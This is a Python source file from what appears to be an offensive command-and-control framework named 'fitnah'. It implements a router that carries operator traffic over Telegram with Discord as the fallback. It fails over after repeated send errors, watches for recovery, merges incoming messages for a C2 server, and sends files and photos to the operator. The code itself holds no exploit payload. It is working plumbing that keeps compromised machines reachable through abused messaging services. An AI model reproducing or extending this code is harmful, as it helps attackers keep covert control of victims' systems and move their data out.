"""
Router — manages Telegram (primary) and Discord (fallback).

Failover logic:
  - Telegram is always tried first (priority=0)
  - After N consecutive Telegram send failures → switch active to Discord
  - Router keeps pinging Telegram in background to detect recovery
  - When Telegram recovers → switch back and notify operator

Fan-in:
  - Merges incoming message queues from all alive transports into one stream
  - C2Server reads from that single merged stream
"""
from __future__ import annotations

import asyncio
import logging
from typing import AsyncIterator, Callable

from fitnah.c2.transport.base import AbstractTransport

log = logging.getLogger(__name__)


class Router:
    def __init__(
        self,
        transports: list[AbstractTransport],
        failover_threshold: int = 3,
        on_failover: Callable[[str, str], None] | None = None,
    ):
        # sort so index-0 is always the highest-priority transport
        self._transports        = sorted(transports, key=lambda t: t.priority)
        self._failover_threshold = failover_threshold
        self._on_failover       = on_failover   # called with (from_name, to_name)

        self._active_idx        = 0             # which transport is currently primary
        self._fail_counts: dict[str, int] = {t.name: 0 for t in transports}
        self._recovery_task: asyncio.Task | None = None

    # ── startup / shutdown ────────────────────────────────────────────────
    async def connect_all(self) -> None:
        for t in self._transports:
            for attempt in range(1, 4):  # up to 3 attempts
                try:
                    await t.connect()
                    log.info("[router] %-10s connected", t.name)
                    break
                except Exception as exc:
                    log.warning(
                        "[router] %-10s connect attempt %d/3 failed: %s",
                        t.name, attempt, exc,
                    )
                    if attempt < 3:
                        await asyncio.sleep(3)
                    else:
                        log.error("[router] %-10s could not connect after 3 attempts", t.name)

    async def disconnect_all(self) -> None:
        if self._recovery_task:
            self._recovery_task.cancel()
        for t in self._transports:
            try:
                await t.disconnect()
            except Exception:
                pass

    # ── send with failover ────────────────────────────────────────────────
    async def send(self, chat_id: str, text: str) -> bool:
        """
        Send text. Tries transports in priority order.
        Increments fail counter on error and triggers failover when threshold hit.
        Returns True if sent successfully.
        """
        for idx, t in enumerate(self._transports):
            if not t.is_alive:
                continue
            try:
                await t.send(chat_id, text)
                self._on_success(t.name)
                return True
            except Exception as exc:
                log.warning(
                    "[router] %-10s send failed: %s", t.name, exc
                )
                await self._on_failure(t.name)

        log.error("[router] all transports failed — message to %s dropped", chat_id)
        return False

    async def send_file(
        self, chat_id: str, filename: str, data: bytes, caption: str = ""
    ) -> bool:
        for t in self._transports:
            if not t.is_alive:
                continue
            try:
                await t.send_file(chat_id, filename, data, caption)
                self._on_success(t.name)
                return True
            except Exception as exc:
                log.warning("[router] %-10s send_file failed: %s", t.name, exc)
                await self._on_failure(t.name)
        return False

    async def send_photo(
        self, chat_id: str, data: bytes, caption: str = ""
    ) -> bool:
        for t in self._transports:
            if not t.is_alive:
                continue
            try:
                await t.send_photo(chat_id, data, caption)
                self._on_success(t.name)
                return True
            except Exception as exc:
                log.warning("[router] %-10s send_photo failed: %s", t.name, exc)
                await self._on_failure(t.name)
        return False

    # ── operator-specific shortcuts ───────────────────────────────────────
    async def notify_operator(self, text: str, operator_chat_id: str) -> None:
        """Always send to operator regardless of active transport."""
        await self.send(operator_chat_id, text)

    # ── fan-in listener ───────────────────────────────────────────────────
    async def listen(self) -> AsyncIterator[dict]:
        """
        Merge incoming message streams from all alive transports.
        Yields one dict per message with '_transport' key set.
        """
        merged: asyncio.Queue[dict] = asyncio.Queue()

        async def _relay(transport: AbstractTransport) -> None:
            async for msg in transport.listen():
                msg["_transport"] = transport.name
                await merged.put(msg)

        relay_tasks = [
            asyncio.create_task(_relay(t), name=f"relay-{t.name}")
            for t in self._transports
            if t.is_alive
        ]

        try:
            while True:
                yield await merged.get()
        finally:
            for task in relay_tasks:
                task.cancel()

    # ── failover logic ────────────────────────────────────────────────────
    def _on_success(self, transport_name: str) -> None:
        self._fail_counts[transport_name] = 0

    async def _on_failure(self, transport_name: str) -> None:
        self._fail_counts[transport_name] = (
            self._fail_counts.get(transport_name, 0) + 1
        )
        count = self._fail_counts[transport_name]

        if count >= self._failover_threshold:
            await self._trigger_failover(transport_name)

    async def _trigger_failover(self, failed_name: str) -> None:
        # find next alive transport after the failed one
        for t in self._transports:
            if t.name != failed_name and t.is_alive:
                log.warning(
                    "[router] failover: %s → %s (after %d failures)",
                    failed_name, t.name,
                    self._failover_threshold,
                )
                if self._on_failover:
                    self._on_failover(failed_name, t.name)

                # start a recovery watcher for the failed transport
                if self._recovery_task is None or self._recovery_task.done():
                    self._recovery_task = asyncio.create_task(
                        self._watch_recovery(failed_name),
                        name=f"recovery-{failed_name}",
                    )
                return

        log.error("[router] failover failed — no alive transports available")

    async def _watch_recovery(self, transport_name: str) -> None:
        """Periodically check if a failed transport has recovered."""
        t = self._get_transport(transport_name)
        if not t:
            return

        log.info("[router] watching for %s recovery...", transport_name)
        while True:
            await asyncio.sleep(30)
            if t.is_alive:
                log.info("[router] %s recovered — switching back", transport_name)
                self._fail_counts[transport_name] = 0
                if self._on_failover:
                    # notify that we're switching back to primary
                    primary = self._transports[0]
                    if t.name == primary.name:
                        self._on_failover("fallback", t.name)
                return

    def _get_transport(self, name: str) -> AbstractTransport | None:
        return next((t for t in self._transports if t.name == name), None)

    # ── manual control ────────────────────────────────────────────────────
    async def force_failover(self, to_name: str) -> bool:
        """Operator-initiated transport switch."""
        t = self._get_transport(to_name)
        if not t or not t.is_alive:
            return False
        log.info("[router] manual failover to %s", to_name)
        if self._on_failover:
            current = self.active_transport
            self._on_failover(current, to_name)
        return True

    async def force_recover(self) -> bool:
        """Force switch back to primary transport."""
        primary = self._transports[0]
        if not primary.is_alive:
            return False
        self._fail_counts[primary.name] = 0
        log.info("[router] manual recover to %s", primary.name)
        return True

    # ── status ────────────────────────────────────────────────────────────
    @property
    def active_transport(self) -> str:
        for t in self._transports:
            if t.is_alive:
                return t.name
        return "none"

    def status_table(self) -> str:
        lines = ["\n  Transport Status"]
        lines.append("  " + "─" * 40)
        for t in self._transports:
            role   = "primary" if t.priority == 0 else "fallback"
            state  = "ALIVE  " if t.is_alive else "DEAD   "
            fails  = self._fail_counts.get(t.name, 0)
            active = " ◄ active" if t.name == self.active_transport else ""
            lines.append(
                f"  {t.name:<12} {role:<10} {state}  "
                f"failures={fails}{active}"
            )
        return "\n".join(lines)
